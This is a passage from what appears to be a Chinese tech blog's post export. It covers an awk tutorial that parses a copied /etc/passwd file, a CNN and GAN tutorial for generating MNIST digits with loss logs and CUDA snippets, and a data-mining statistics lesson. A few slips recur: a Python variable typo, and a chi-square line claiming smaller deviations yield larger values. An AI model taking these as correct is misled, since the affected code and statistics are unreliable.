User:/var/ftp:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologinmail:x:8:12:mail:/var/spool/mail:/sbin/nologinhalt:x:7:0:halt:/sbin:/sbin/haltshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownsync:x:5:0:sync:/sbin:/bin/synclp:x:4:7:lp:/var/spool/lpd:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologinroot:x:0:0:root:/root:/bin/bash awk一个强大的文本分析工具，把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行分析处理。 基本用法 awk [选项参数] ‘pattern1{action1} pattern2{action2}…’ filename pattern：表示AWK在数据中查找的内容，就是匹配模式 action：在找到匹配内容时所执行的一系列命令 选项参数说明 表1-55 选项参数 功能 -F 指定输入文件折分隔符 -v 赋值一个用户定义变量 案例实操 （0）数据准备 1[root@server1 myshells]# sudo cp /etc/passwd ./ （1）搜索passwd文件以root关键字开头的所有行，并输出该行的第7列。 12[root@server1 myshells]# awk -F: '/^root/{print $7}' passwd /bin/bash （2）搜索passwd文件以root关键字开头的所有行，并输出该行的第1列和第7列，中间以“，”号分割。 12[root@server1 myshells]# awk -F: '/^root/{print $1&quot;,&quot;$7}' passwd root,/bin/bash 注意：只有匹配了patter的行才会执行action （3）只显示/etc/passwd的第一列和第七列，以逗号分割，且在所有行前面添加列名user，shell在最后一行添加”dahaige，/bin/zuishuai”。 1234567[root@server1 myshells]# awk -F : 'BEGIN{print &quot;user, shell&quot;} {print $1&quot;,&quot;$7} END{print &quot;dahaige,/bin/zuishuai&quot;}' passwduser, shellroot,/bin/bashbin,/sbin/nologin。。。atguigu,/bin/bashdahaige,/bin/zuishuai 注意：BEGIN 在所有数据读取行之前执行；END 在所有数据执行之后执行。 （4）将passwd文件中的用户id增加数值1并输出 12345[root@server1 myshells]# awk -v i=1 -F: '{print $3+i}' passwd1234 awk的内置变量 表1-56 变量 说明 FILENAME 文件名 NR 已读的记录数（行号） NF 浏览记录的域的个数（切割后列的个数） 案例实操 （1）统计passwd文件名，每行的行号，每行的列数 1234[root@server1 myshells]# awk -F: '{print &quot;filename:&quot; FILENAME &quot;, linenumber:&quot; NR &quot;,columns:&quot; NF}' passwd filename:passwd, linenumber:1,columns:7filename:passwd, linenumber:2,columns:7filename:passwd, linenumber:3,columns:7 （2）切割IP 12[root@server1 myshells]# ifconfig eth0 | grep &quot;inet addr&quot; | awk -F: '{print $2}' | awk -F &quot; &quot; '{print $1}' 192.168.1.102 （3）查询sed.txt中空行所在的行号 12[root@server1 myshells]# awk '/^$/{print NR}' sed.txt 5","link":"/2021/09/21/shell%E7%BC%96%E7%A8%8B/"},{"title":"基于对抗网络生成数字图像","text":"基于生成对抗网络生成数字图像已知，采用卷积神经网络构建的生成对抗网络会比采用全连接网络的准确率高，所以会按照卷积网络、生成对抗网络、利用对抗网络生成数字图像的顺序进行介绍 参考资料： https://www.jianshu.com/p/1ea2949c0056 https://www.jianshu.com/p/fbcada37ca45 https://www.jianshu.com/p/77627ada2935 Convolutional Neural Networks (LeNet) - DeepLearning 0.1 documentation. DeepLearning 0.1. LISA Lab. [31 August 2013]. https://zhuanlan.zhihu.com/p/33752313 王坤峰，荀超，段艳杰等.生成式对抗网络GAN的研究进展与展望[J].自动化学报.2017 卷积神经网络卷积神经网络的理解： ​ 卷积神经网络的架构 全连接与稀疏连接假设一个神经网络中有m个输入、n个输出。那么对于全连接的矩阵相乘则需要mn个参数。如果输出的连接数被设定为j个，那么采用稀疏连接则只需要jn个参数。在许多情景中，在连接数被设定为j，且j比m要小得多的情况下，机器学习应用的速度获得大幅度的提升，并且仍然能保持较好的效果。 让我们从下图中对比一下全连接与稀疏连接的神经网络。 ​ 全连接的神经网络 ​ 稀疏连接的神经网络 稀疏连接的方法可以使神经网络的连接结构更加简单，同时以更高效的方法来描述变量之间的关系。对比上述两幅图，从输入的角度（自下而上）来看，x3输入在全连接中与所有的输出单元相连接。而在稀疏连接中x3仅仅与s2、s3、s4相连接。 ​ 自上而下从输出看输入 反过来从输出来看输入也是如此。 也许对于卷积网络，其稀疏连接方式的感受野无法设计整个输入，但是当卷积层数增加的时候（深层卷积网络）其单个输出的感受野还是可以涉及到整个输入的。 ​ 多层稀疏连接的感受野 卷积网络通过采用稀疏连接的方法减少了需要存储的参数（权重）的数量，减少了机器学习模型所需要的存储空间，从而提升了模型的统计效率。从计算方面来看，较少的参数数量意味着计算输出时需要更少的参数，从而计算效率也得到大幅提升。 参数共享参数共享是紧接着稀疏连接而来的。在模型中多个函数使用相同的参数则是参数共享。这个共享的参数通常是权重，即共享权重（Shared Weight）。在传统的神经网络中，每个权重被使用一次。而使用共享权重，一个输入位置的参数值也会被应用在其他的输入位置。在卷积网络中，通过参数共享，一个卷积核内的参数会被应用在输入的所有位置。 ​ 参数共享示意图 上图中黑色的箭头表示了在两个不同的模型中使用了特殊参数的连接。上图中，黑色箭头表示在卷积模型中对3个元素核的中间元素的使用。由于参数共享，因此这个单独的参数被用于所有的输入的位置。而在下图中，这个单独的黑色的箭头表示在全连接模型中对权重矩阵的中间元素的使用，下面这个模型没有参数共享，所以参数只使用了一次。 等变表示对于卷积来说，参数共享的特殊形式使得神经网络层具有了对平移等变（Equivariance）的性质。一个函数满足输入改变，那么输出也以同样的方式改变这一个性质，那么这个函数就是等变的。即输入发生变化输出也相应发生同样的变化。 如果f(g(x))=g(f(x))，那么函数f(x)对于变换g具有等变性。在卷积网络中，令g是输入的任意平移函数，那么卷积函数对于g具有等变性。举例，令I表示图像在整数坐标上的亮度函数，g表示图像函数的变换函数，即把一个图像映射到另一个图像函数的函数。令I’=g(I)，图像函数I’满足I’(x,y)=I(x-1,y)。上述函数所做的变换就是将I中的每一个像素均向右移动一个单位。如果先对图像I施加变换，再进行卷积操作f，结果等同于对图像I的卷积施加变换。也就是说，如果图像中的目标发生了一定的位移之后，卷积输出的表达也会产生相同的位移。这个特征对于作用在一个相对小区域的算子十分有用。 卷积网络的经典结构卷积网络的层结构简单的卷积神经网络由一系列不同的层构成，每个层将上一层的一组隐藏层的输出通过一个可微的函数产生一组新的隐藏层的输出。 一个典型的卷积网络有几种不同的层构成： 1、卷积层（Convolutional Layer，CONV） 2、ReLU（Rectified Linear Unit） ReLU(x)=max(0,x) 3、池化层（Pooling Layer，POOL） 4、全连接层（Fully-Connected Layer，FC） 全连接层与普通的神经网络相同。 这些层极其具体的作用如下表所示： 名称 作用 INPUT 输入层：如，以图像的像素的值作为输入 CONV 卷积层：卷积层连接输入的一小块区域，并计算卷积核与之对应的输入区域之间的点乘作为卷积层的输出 ReLU 激活函数：将CONV层中输出的每个元素通过一个非线性激活函数 POOL 池化层：在空间上（Height和Width）执行降采样操作 FC 全连接层：在分类中，将计算每个类别对应的分数，和传统神经网络一样，全连接层的每个神经元与前一层的所有输出相连 上述从INPUT到FC是一个典型的卷积网络的层结构。 CIFAR-10数据集共有60000张彩色图像，这些图像是32*32，分为10个类，每类6000张图。 ​ CIFAR-10数据集示例 以CIFAR-10数据集作为输入来讲解一下卷积网络的各个层的功能： 名称 作用 INPUT 输入层：输入一张大小为32323的3通道RGB图像 CONV 卷积层：如CONV层有12个卷积核，则通过CONV层输出的尺寸为323212 ReLU 激活函数：保持图像的尺寸为323212 POOL 池化层：以22的小窗做降采样操作，特征图的尺寸缩小到1616*12 FC 全连接层：在分类中，输出的尺寸为1110，也就是CIFAR-10中10个类别分别对应的分数 各种卷积网络的结构模式其实，目前很多的卷积网络都是根据一种层级结构的模式进行不同的堆叠。最常见的网络的结构是将 CONV-ReLU堆叠若干遍之后，紧接着一个POOL池化层。然后再重复上述的结构，直到图像在空间上转换成为一个较小的尺寸。最后使用一个全连接层转换为输出。 让我们以一个正则表达式来表示上述的模式： INPUT -&gt; [[CONV -&gt; RELU] * N -&gt; POOL ? ]M -&gt; [FC-&gt;RELU] * K -&gt; FC 其中， N代表重复N次，？代表0或1次，一般来说0&lt;N≤3，M≥0,0&lt;K≤3。 ​ VGGNet (2014) 卷积层的实现卷积层的参数有一组可以学习的卷积核(Kernel)/滤波器（Filter）构成。每个卷积核在空间上是尺寸较小，穿过输入集的整个深度，如下图所示： ​ 一个卷积网络的示意图 卷积网络的第一层的卷积核尺寸通常为333（宽3个像素 高3个像素 深度为通道数是3的RGB图像）或553。在前向传播的过程中，在输入图像上沿着高和宽的方向滑动各个卷积核/滤波器（滤波器是通过向量来表示对输入进行卷积操作的权重），并在所有的位置上面计算卷积核与输入的点乘。当完成沿着宽和高滑动卷积核之后，会得到一个二维的激活映射（Activation Map），这个激活映射也被称为特征映射（Feature Map）或是特征图。特征图的含义是其在每个空间位置上输入对于卷积核的响应。 ​ 滑动卷积核/滤波器得到特征映射 卷积层上的每个卷积核都会生成一个激活特征映射，将这些特征映射沿着深度的方向排列起来并作为卷积层的输出。 比如一个553的滤波器在32323的图像上沿着宽和高滑动，遍历空间内所有的点之后生成的特征图为28281。如果使用3个这样的滤波器/卷积核进行操作之后，将会生成3个28281的特征映射。所以卷积层最终的输出大小为28283。 通过3个滤波器得到的3层特征映射堆叠 在卷积网络中堆叠CONV-RELU这样的结构，卷积核/滤波器的深度要与输入的特征图的深度一致。也就是说，后一个卷积层的卷积核/滤波器大小需要与前一个卷积层输出的维度一致。 ​ 可视化卷积网络 通过观察上述卷积网络的特征图的输出，我们可以发现，随着网络的层数的不断加深，特征图上的响应在表达语义的层面上不断加深。最初的层提取了低层特征（Low-Level Feature），而此后的卷积层在低层特征的基础上产生了具有语义的图形和纹理。最后的卷积层对明确语义的目标产生强烈的响应，也就是说其抽取了图像的高层特征。 卷积层的空间排布在卷积网络中，输出的特征图的尺寸由深度（Depth）、步长（Stride）和零值填充（Zero-Padding）三个超参数决定。 对于输出图的深度这个超参数，其由使用的卷积核/滤波器的数量决定，每个卷积核都负责从输入图像中提取出不同的信息（见下图）。 ​ 不同的卷积操作对应的卷积核以及卷积输出 在卷积网络中对于同一个输入，为了提取不同的特征，需要使用不同的卷积核操作，并且将响应的特征映射堆叠排列起来作为输出。 然后就是滑动卷积核的步长。当滑动卷积核的步长为1的时候，卷积核/滤波器每次移动1个像素的位置。当步长为2的时候，卷积核每次移动2个像素的位置…步长越大，生成的特征映射的空间尺寸就越小。 最后是零值填充。有的时候，为了使用更深的卷积网络，此时则不希望特征映射在卷积的过程中尺寸下降地太快，因此会在输入的边缘使用零值填充来增大输入尺寸。 假设当前卷积层的输入图像尺寸为W、卷积神经元的感受野为F、步长S、边缘零值填充数量为P，则输出特征映射的尺寸为： ​ 经过卷积层的特征图尺寸 数据输入层该层要做的处理主要是对原始图像数据进行预处理，其中包括： 去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。 PCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化 去均值与归一化效果图： 去相关与白化效果图： 把卷积层输出结果做非线性映射。 激活函数有： sigmoid：在两端斜率接近于0，梯度消失。 ReLu：修正线性单元，有可能出现斜率为0，但概率很小，因为mini-batch是一批样本损失求导之和。 TIPS: CNN慎用sigmoid！因为会映射到0-1，和图像的特征不太符合 首先试RELU，因为快，但要小心点。 如果RELU失效，请用 Leaky ReLU或者Maxout。 某些情况下tanh倒是有不错的结果，但是很少。 池化层也叫下采样层，具有特征不变性。 为了减少表达空间的尺寸，卷积网络的连续的卷积层之间往往会周期性地插入池化层。池化层能逐渐减少表达空间的尺寸，降低参数数量和计算开销，并控制卷积网络减少过拟合。 ​ 最大池化图解 在卷积网络中，最常见的池化操作是最大池化（Max Pooling），也就是取视野范围内的最大值。对上图最大池化示意图而言，其输入特征图的尺寸是44，步长为2的池化操作后，得到22的输出特征图。在池化窗口大小是2的是，上图中被分为四种颜色的四个区域，每个区域对应输出特征图的一个像素，对每个窗口取其中的最大值作为输出特征图相应位置的值。 池化窗口的选取通常是2或3，如果窗口大小过大则会对特征图的信息造成破坏。除了最大池化之外，还有平均池化（Average Pooling）和L2-Norm池化。 ​ 特征图池化操作输出的效果 最大池化操作的反向传播形式很简单：将梯度沿着正向传播的过程中最大值的路径向下传递。池化层的正向传递通常会保留最大激活单元下标，作为反向传递时候的传播路径。 CNN的优缺点优点： 共享卷积核，优化计算量。 无需手动选取特征，训练好权重，即得特征。 深层次的网络抽取图像信息丰富，表达效果好。 保持了层级网络结构。 不同层次有不同形式与功能。 缺点： 需要调参，需要大样本量，GPU等硬件依赖。 物理含义不明确。 与NLP/Speech共性： 都存在局部与整体的关系，由低层次的特征经过组合，组成高层次的特征，并且得到不同特征之间的空间相关性。 卷积神经网络之典型CNN结构 LeNet，这是最早用于数字识别的CNN AlexNet， 2012 ILSVRC比赛远超第2名的CNN，比 LeNet更深，用多层小卷积层叠加替换单大卷积层。 ZF Net， 2013 ILSVRC比赛冠军 GoogLeNet， 2014 ILSVRC比赛冠军 VGGNet， 2014 ILSVRC比赛中的模型，图像识别略差于GoogLeNet，但是在很多图像转化学习问题(比如object detection)上效果奇好 卷积神经网络常用的框架Caffe 源于Berkeley的主流CV工具包，支持C++,python,matlab Model Zoo中有大量预训练好的模型供使用 Torch Facebook用的卷积神经网络工具包 通过时域卷积的本地接口，使用非常直观 定义新网络层简单 TensorFlow Google的深度学习框架 TensorBoard可视化很方便 数据和模型并行化好，速度快. 生成对抗网络GANGAN的基本原理GAN 的核心思想来源于博弈论的纳什均衡。它设定参与游戏双方分别为一个生成器(Generator)和一个判别器 (Discriminator), 生成器的目的是尽量去学习真实的数据分布 ,而判别器的目的是尽量正确判别输入数据是来自真实数据还是来自生成器 ;为了取得游戏胜利 , 这两个游戏参与者需要不断优化 ,各自提高自己的生成能力和判别能力 ,这个学习优化过程就是寻找二者之间的一个纳什均衡。GAN的计算流程与结构如图 2 所示。任意可微分的函数都可以用来表示 GAN 的生成器和判别器 由此 ,我们用可微分函数D和 G来分别表示判别器和生成器 ,它们的输入分别为真实数据x和随机变量 z.G(z)则为由G 生成的尽量服从真实数据分布pdata的样本。如果判别器的输入来自真实数据 ,标注为1.如果输入样本为 G(z), 标注为 0. 这里 D 的目标是实现对数据来源的二分类判别 :真 ( 来源于真实数据x 的分布 )或者伪 ( 来源于生成器的伪数据 G(z)),而G的目标是使自己生成的伪数G(z)在D上的表现 D(G(z))和真实数据x在D上的表现 D(x)一致 ,这两个相互对抗并迭代优化的过程使得D和G 的性能不断提升 ,当最终D的判别能力提升到一定程度 ,并且无法正确判别数据来源时 ,可以认为这个生成器G已经学到了真实数据的分布。 手写字的例子来进行进一步窥探GAN的结构。 我们现在拥有大量的手写数字的数据集，我们希望通过GAN生成一些能够以假乱真的手写字图片。主要由如下两个部分组成： 定义一个模型来作为生成器（图中蓝色部分Generator），能够输入一个向量，输出手写数字大小的像素图像。 定义一个分类器来作为判别器（图三中红色部分Discriminator）用来判别图片是真的还是假的（或者说是来自数据集中的还是生成器中生成的），输入为手写图片，输出为判别图片的标签。 训练方法基本流程如下： 训练生成器之后达到（c）样本状态，此时生成器分布相比之前，逼近了真实样本分布。 经过多次反复训练迭代之后，最终希望能够达到（d）状态，生成样本分布拟合于真实样本分布，并且判别器分辨不出样本是生成的还是真实的（判别概率均为0.5）。也就是说我们这个时候就可以生成出非常真实的样本了，目的达到。 训练相关理论包含min，max的公式 判别器在这里是一种分类器，用于区分样本的真伪，因此我们常常使用交叉熵（cross entropy）来进行判别分布的相似性，交叉熵公式如下图所示： Tips: 公式中pi和qi为真实的样本分布和生成器的生成分布。由于交叉熵是非常常见的损失函数，这里默认大家都较为熟悉，就不进行赘述了。 在当前模型的情况下，判别器为一个二分类问题，因此可以对基本交叉熵进行更具体地展开如下图所示： Tips: 其中，假定y1为正确样本分布，那么对应的（1-y1）就是生成样本的分布。D表示判别器，则D(x1)表示判别样本为正确的概率，(1-D(x1)) 则对应着判别为错误样本的概率。这里仅仅是对当前情况下的交叉熵损失的具体化。相信大家也还是比较熟悉。 对于GAN中的样本点 xi ，对应于两个出处，要么来自于真实样本，要么来自于生成器生成的样本 x^ ~G(z) ( 这里的z是服从于投到生成器中噪声的分布)。 其中，对于来自于真实的样本，我们要判别为正确的分布 yi。来自于生成的样本我们要判别其为错误分布（1-yi）。将上面式子进一步使用概率分布的期望形式写出（为了表达无限的样本情况，相当于无限样本求和情况），并且让yi 为 1/2 且使用G(z)表示生成样本可以得到如下图的公式： 现在我们再回过头来对比原本的的minmax公式，发现他们其实就是同一个东西 生成数字图像采用的数据集因为GANS中超参数的设置非常非常麻烦，同样也需要很多的训练epoch。为了加快训练速度，这里使用MNIST数据集，拥有60，000个训练集和10，000测试集。每个图片中包含一个数字（0-9，背景为黑色，数字为白色）。这个数据集通过标准神经网络的训练已经可以达到超过99%的准确率。 这里使用pytorch中自带的数据集工具进行对数据的提取： 原始图像： 随机分布生成的噪声： 定义卷积判别网络： 定义卷积生成网络 定义损失函数 定义优化器 定义训练函数 实验结果： 早期： 最后的结果： 损失值： Iter: 250, D: 1.057, G:2.979 Iter: 500, D: 0.8309, G:1.727 Iter: 750, D: 0.918, G:1.692 Iter: 1000, D: 1.195, G:0.831 Iter: 1250, D: 0.9382, G:1.559 Iter: 1500, D: 1.344, G:1.697 Iter: 1750, D: 1.01, G:1.106 Iter: 2000, D: 1.214, G:1.769 Iter: 2250, D: 0.9676, G:1.234 Iter: 2500, D: 1.056, G:0.9057 Iter: 2750, D: 1.062, G:1.124 Iter: 3000, D: 1.158, G:0.8272 Iter: 3250, D: 0.9431, G:1.994 Iter: 3500, D: 1.112, G:1.288 Iter: 3750, D: 0.9812, G:0.9615 Iter: 4000, D: 1.125, G:1.248 Iter: 4250, D: 0.8623, G:1.461 Iter: 4500, D: 1.029, G:1.31 Iter: 4750, D: 0.8219, G:1.661 Iter: 5000, D: 0.9472, G:1.26 Iter: 5250, D: 0.9054, G:1.3 Iter: 5500, D: 0.8741, G:2.153 Iter: 5750, D: 0.9253, G:1.002 Iter: 6000, D: 0.9568, G:1.278 Iter: 6250, D: 0.9611, G:1.35 Iter: 6500, D: 0.8447, G:1.67 Iter: 6750, D: 0.9014, G:1.341 Iter: 7000, D: 0.9592, G:1.282 Iter: 7250, D: 0.985, G:1.329 Iter: 7500, D: 0.9468, G:1.517 Iter: 7750, D: 1.003, G:1.364 注：以上实验结果是已经得出的较优模型损失值等得出的较好结果 去掉卷积层，实现较为简单的生成对抗网络 改变网络结构为： 初始实验结果： 最终实验结果： 损失值： Iter: 250, D: 1.511, G:0.8354 Iter: 500, D: 1.359, G:0.612 Iter: 750, D: 1.389, G:2.019 Iter: 1000, D: 1.147, G:2.05 Iter: 1250, D: 0.833, G:2.16 Iter: 1500, D: 0.9256, G:1.52 Iter: 1750, D: 1.087, G:1.98 Iter: 2000, D: 0.9269, G:1.244 Iter: 2250, D: 1.108, G:1.061 Iter: 2500, D: 1.057, G:1.093 Iter: 2750, D: 1.115, G:1.932 Iter: 3000, D: 0.9873, G:1.402 Iter: 3250, D: 0.7824, G:1.464 Iter: 3500, D: 0.9784, G:1.319 Iter: 3750, D: 1.112, G:1.123 改变FC层网络结构为：（0&lt;K≤3。） 初始实验结果： 最终实验结果： 损失值： Iter: 250, D: 0.9404, G:1.127 Iter: 500, D: 0.8368, G:1.118 Iter: 750, D: 0.8559, G:0.8823 Iter: 1000, D: 1.018, G:1.133 Iter: 1250, D: 0.8485, G:1.997 Iter: 1500, D: 0.6933, G:1.756 Iter: 1750, D: 0.7199, G:1.98 Iter: 2000, D: 0.7108, G:1.534 Iter: 2250, D: 0.7834, G:2.019 Iter: 2500, D: 0.7777, G:1.758 Iter: 2750, D: 0.8702, G:1.776 Iter: 3000, D: 0.7444, G:1.677 Iter: 3250, D: 0.769, G:1.605 Iter: 3500, D: 1.103, G:1.76 Iter: 3750, D: 0.6795, G:2.354 Iter: 4000, D: 0.7162, G:1.787 Iter: 4250, D: 0.6472, G:2.09 Iter: 4500, D: 0.6834, G:2.19 Iter: 4750, D: 0.5053, G:2.736 Iter: 5000, D: 0.6162, G:2.434 Iter: 5250, D: 0.5765, G:3.15 Iter: 5500, D: 0.6916, G:2.053 Iter: 5750, D: 0.6257, G:2.553 Iter: 6000, D: 0.5586, G:2.937 Iter: 6250, D: 0.7283, G:2.733 Iter: 6500, D: 0.5604, G:3.598 Iter: 6750, D: 0.7311, G:1.48 Iter: 7000, D: 0.5016, G:3.57 Iter: 7250, D: 0.3809, G:3.069 Iter: 7500, D: 0.5193, G:2.837 更改模型的依据： GPU加速： 方法一：直接调用cuda()方法 12345678910real_data = Variable(x).cuda() *#* *真实数据*g_fake_seed = Variable(sample_noise).cuda()fake_images = G_net(g_fake_seed).cuda() *#* *生成的假的数据*D_DC = build_dc_classifier().cuda()for x, _ in train_data: X = X.cuda() 方法二：可以分别调用多块GPU 1234device = torch.device('cuda:0')X = X.to(device)net.to('cuda:0')b=torch.zeros(x.size(0),self.out_num_caps,self.in_num_caps).to('cuda:0')","link":"/2021/07/28/%E5%9F%BA%E4%BA%8E%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C%E7%94%9F%E6%88%90%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F/"},{"title":"数据挖掘常用算法","text":"一、数据特征分析与预处理1.1 数据类型1.1.1 数据集类型 结构化数据 大部分的应用将数据存储在关系数据库中，每条记录包含若干个属性。 半结构化数据 半结构化数据也具有一定的结构，但没有像关系型数据库中那样严格的定义，也被称为‘自描述’。半结构化数据使用标签来标识数据中的每个元素。常见的半结构化数据主要有XML文档和JSON数据。 非结构化数据 非结构化数据没有预定义的数据模型 1.1.2 数据属性的类型常见的属性类型 标称属性(Norminal Attribute) 标称属性类似于标签，其中的数学或符号只是用来对物体进行识别和分类，取值往往是枚举类型 分类属性(Categorical) 统计学：定义变量 二元属性(布尔属性)：非对称，如心脏病检测结果 ​ 对称，如性别属性 序数属性(Ordinal Attribute) 有顺序关系，不仅包含了标称属性的全部特征，还能反应对象之间的等级和顺序 如：优、良、中、差 统计学：定序变量 数值属性(Numeric Attribute) 区间标度(Interval Scaled)属性 用相等的单位尺度度量，属性的值有序，可以为正、零或负。相等的数字距离代表所测量的变量相等的数量差值。定距变量（统计学） 如：不能说考90分的同学知识的掌握是考45分同学的2倍：不能说20度比10度高2倍 比率标度属性 如果数值属性存在固定零点，那么属性值之间的比率关系就有意义了，例如：开氏温度、年龄、长度、重量 因存在绝对零点，因此可以进行比率计算，即加减乘除运算。 标称属性、二元属性、序数属性的取值是定性的，不能反应不同等级的差异程度，不能进行加减乘数等数学运算。 标称属性 序数属性 区间标度属性 比率标度属性 频数统计 √ √ √ √ 众数 √ √ √ √ 顺序关系 √ √ √ 中位数 √ √ √ 平均数 √ √ 量化差异 √ √ 加减运算 √ √ 乘除运算 √ 定义”真正零度” √ 1.2 数据的描述性特征1.2.1 描述数据集集中趋势的度量 算数平均数(Arithmetic Mean) 缺点：易受集合中极端值或离群点的影响 中位数(Median) 典型的位置平均数，当数据集合的分布呈现偏斜的时候，采用中位数作为集中趋势的度量更加有效 众数(Mode) 数据呈现多峰分布的时候，中位数也不能有效的描述集中趋势，当数据量较大并且集中趋势比较明显的时候，众数更适合作为描述数据代表性水平的度量 k百分位数(Percentile) 将一组数据从小到大排序，并计算相应的累积百分比，处于k%位置的值称为第k百分位数，用Xk%表示 若Xk%位于第i个与第j个数之间时(i&lt;j)，可以采用几种插值的方法来计算Xk%：线性插值(Linear)、下界(Lower)、上界(Higher)、中点(Midpoint)和最近邻(Nearest) 例子：[-35, 10, 20, 30, 40, 50, 60, 100]求25百分位，即X25% 确定Xk%方法： (n + 1) x k% 1 + (n - 1) x k% 1+(8-1)*25%=2.75介于第2个数与第3个数之间 线性插值：X25%=10+(20-10)*0.75=17.5 下界、上界、中点、最近邻分别为10 20 15 20 1234567import numpy as npX = np.array([-35, 10, 20, 30, 40, 50, 60, 100])k = 25Xk = np.percentile(X, k, interpolation='linear')Nx = X.shape[0]indices = 1 + (Nx - 1) * k / 100.0print(incides, Xk) 四分位数(Quartile) 四分位数是一种特殊的百分位数 第一四分位数Q1，又称“较小四分位数”，即25百分位数 第二四分位数Q2，就是中位数 第一四分位数Q3，又称“较大四分位数”，即75百分位数 四分位数是比较常用的分析数据分布趋势的度量，很多数据可视化方法可以用到。 1.2.2 描述数据离中趋势的度量 极差(Range) 最大值与最小值之差，又称范围误差或全距，R 四分位数极差(InterQuartile Range, IQR) ==IQR = Q3 - Q1== 反映了数据集合中间50%数据的变动范围 超过Q3 +IQR或者低于Q1-IQR可能是离群点 注意：如果数据不服从正态分布，这种方法受数据偏斜程度的影响较大 平均绝对离差 计算数据集合中各个数值与平均的距离(绝对值)总和，然后取其平均数 因存在绝对值，不常用 方差和标准差(Variance and Standard Deviation)不足：大小与数据本身大小密切相关，且带有量纲，不同量纲的数据集合或者刻画对象的不同属性之间难以比较离散程度的大小 离散系数(Coefficient of Variation) 离散系数称为变异系数，样本变异系数是样本标准差与样本平均数之比:$$C_v = \\frac{S}{\\bar{x}}$$注意：离散系数只对由比率标度属性计算出来的数值有意义 1.2.3 数据分布形态的度量 数据的偏态分布及度量 众数在均值左边，大的极端值在右，右向偏态，正偏态 众数在均值右边，大的极端值在左，左向偏态，负偏态 偏态系数 g1 样本偏态系数 SK SK &gt; 0，正偏态 SK &lt; 0，负偏态 |SK| &gt; 1，数据偏态程度很高 0.5 &lt;= |SK| &lt;= 1，偏态程度中等 |SK| &lt; 0.5，认为数据的分布对称 SK越接近0，分布的偏斜程度越小 皮尔逊偏态系数(Pearson’s Coefficient of Skewness)$$Sk_1 = \\frac{\\bar{X}-M_0}{s}$$或$$Sk_2 = \\frac{3(\\bar{X} - M_d)}{s}$$其中，$\\bar{X}$是平均数，$M_0$是众数，$M_d$是中位数，$s$是样本标准差 数据峰度及度量 峰度用于衡量数据分布的平坦度(Flatness)，它以标准正态分布作为比较的基准。峰度的度量使用峰度系数(Kurtosis) K$$K = \\frac{\\frac{1}{n}\\sum_{i=1}^{n}(x_i-\\bar{x})^4}{(\\frac{1}{n}\\sum_{i=1}^{n}(x_i-\\bar{x})^2)^2} - 3$$上述定义被称为超值峰度(Excess Kurtosis)，减3是为了让正态分布的峰度值为0. $K\\approx0$，称为常峰态(Mesokurtic)，接近与正态分布 $K&lt;0$，称为低峰态(Platykurtic) $K&gt;0$，称为高峰态(Leptokurtic) 数据偏度和峰值的作用 1.2.4 数据分布特征的可视化、 箱型图 五数概括法：最小值、Q1、中位数、Q3、最大值 数据偏度和峰度计算与可视化 1.3 数据的相关分析1.3.1 相关分析 散点图 相关系数 协方差：$cov(X,Y)=\\frac{\\sum_{i=1}^n(X_i-\\bar{x})(Y_i-\\bar{Y})}{n-1}$ 协方差的正负表示两个属性相关性的方向，绝对值代表它们之间关系的强弱 不足：协方差的大小与属性的取值范围、量纲都有关系，构成不同的属性对之间的协方差难以进行横向比较。因此将协方差归一化 样本相关系数：$r(X,Y)=\\frac{cov(X,Y)}{S_xS_y}$ S为样本标准差 相关系数的取值：$-1\\le{r}\\le{1}$ 若$0&lt;{r}\\le{1}$，表明X和Y之间存在正线性相关关系 若$-1\\le{r}&lt;{0}$，表明X和Y之间存在负线性相关关系 若$r=0$，表明二者之间不存在线性相关关系，但并不排除二者之间存在非线性相关性。 1.3.2 卡方$(X^2)$检验相关系数可以用来分析两个数值型属性之间的相关性 两个标称属性(分类属性)之间的独立性检验可以使用卡方检验 独立性检验是对两个属性的不同分类的计数进行分析，以判断它们是相互关联，还是彼此独立。 一般是首先建立一个假设，即这两个属性彼此独立而无关联，然后根据这个假设，由实测次数推算出理论次数，再与相应的实测次数比较，求出$X^2$值，最后检验两个属性是否确实彼此独立，从而决定拒绝或接受彼此独立而无关联的假设。 卡方统计量：$X^2 = \\sum\\frac{(Observed - Expected)^2}{Expected}$ $X^2$是统计样本的实际观测值与理论推算值之间的偏离程度。 理论值与实际值之间偏差越大，$X^2$值越大，就越不符合 偏差越小，$X^2$值越大，就越趋于符合 若两值完全相等，$X ^ 2$值为0，表示完全符合 自由度：$dof = (r-1)(c-1)$其中r和c分别为两个属性各自分类值的个数 1.4 数据预处理1.4.1 数据变换、离散化与编码 零均值化(Mean Removal) 给定一个数值型数据集合，将每一个属性的数据都减去这个属性的均值后，形成一个新数据集合，变换后各属性的数据之和与均值都为零，多个属性经过零均值化变换后，都以零为均值分布，各属性的方差不发生变化，各属性的协方差也不发生变化。 应用：对信号数据零均值化，可以消除直流分量的干扰 变换过程：如果将多个属性构成的数据看成是空间中的点，那么经过零均值化的数据就是在空间上进行了平移，分布形状没有发生改变。 Z分数变换 标准分数(Standard Score)也叫z分数(z-score)，用公式表示为：$$z = \\frac{x - \\bar{x}}{s}$$其中$x$为原始数据，$\\bar{x}$为样本均值，$s$为样本标准差，变换后数据的均值为0，方差为1 z值表示原始数据和样本均值之间的距离，以标准差为单位进行计算 应用：当数据的各个属性值范围差异较大，或者挖掘算法假设数据服从正态分布的情况下，z分数变换很有用，如线性回归、逻辑回归以及线性判别分析等算法。 缺点：假如原始数据没有呈高斯分布，标准化的数据分布效果并不好 最大——最小规范化 最大——最小规范化(Min-MAx Normalization)又称离差标准化，是对原始数据的线性转化，将数据按比例缩放到一个特定区间$$v’ = min’ + \\frac{v - min}{max - min}(max’ - 